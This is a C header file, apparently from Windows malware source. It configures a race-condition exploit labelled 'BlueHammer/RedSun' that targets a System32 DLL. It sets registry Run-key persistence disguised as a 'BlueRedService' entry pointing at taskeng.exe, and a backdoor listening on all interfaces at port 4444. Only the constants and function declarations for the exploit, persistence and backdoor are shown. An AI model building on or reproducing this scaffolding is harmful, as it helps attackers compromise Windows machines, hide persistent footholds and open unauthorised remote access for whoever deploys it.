#pragma once

#define WINVER 0x0A00
#define _WIN32_WINNT 0x0A00

#include <winsock2.h>
#include <ws2tcpip.h>

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shellapi.h>
#include <conio.h>

// Custom structures
#include "types.h"

// Define constants and paths
#define WINVER 0x0A00
#define _WIN32_WINNT 0x0A00

// Exploit Timing (BlueHammer/RedSun)
// The race condition window is typically < 10ms, but we add a safe buffer.
#define EXPLOIT_RACE_DELAY_MS 50

// WDF Filter DLL (Target for BlueHammer/RedSun)
#define WDF_FILTER_DLL_PATH L"C:\\Windows\\System32\\msctls.dll"

// Persistence Path
#define PERSIST_PATH L"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define PERSIST_VAL_NAME L"BlueRedService"
#define PERSIST_VAL_DATA L"C:\\Windows\\System32\\taskeng.exe"

// Backdoor Config
#define BACKDOOR_PORT 4444
#define BACKDOOR_HOST "0.0.0.0"
#define SOCKET_BUFFER_SIZE 4096

extern BOOL ExecuteExploitLogic(void);
extern BOOL RegisterPersistence(void);
extern BOOL StartBackdoor(void);